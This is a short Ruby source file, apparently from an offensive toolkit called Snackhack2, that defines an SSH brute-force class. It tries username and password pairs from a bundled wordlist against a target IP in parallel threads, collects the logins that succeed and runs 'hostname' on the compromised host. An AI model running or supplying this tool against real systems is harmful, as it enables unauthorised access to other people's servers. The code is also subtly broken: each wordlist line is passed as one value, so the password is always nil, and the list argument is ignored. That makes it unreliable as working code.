require 'net/ssh'
module Snackhack2
	class SSHBute
		def initialize(ip, list: nil)
			@ip = ip
			@list = list
			@success_list = []
		end
		def list
			File.join(__dir__, "lists", "sshbrute.txt")
		end
		def run
			threads = []
			File.readlines(list).each { |usr,pass| threads << Thread.new { brute(usr,pass) }}
			threads.each(&:join)

		p @success_list
		end
		def brute(username, pass)
			begin
				Net::SSH.start( @ip, username, :password => pass, :timeout => 1) do |ssh|
					@success_list << [username, pass]
	            	ssh.exec!("hostname")
	            end
	        rescue Net::SSH::AuthenticationFailed
	        end
        end
	end
end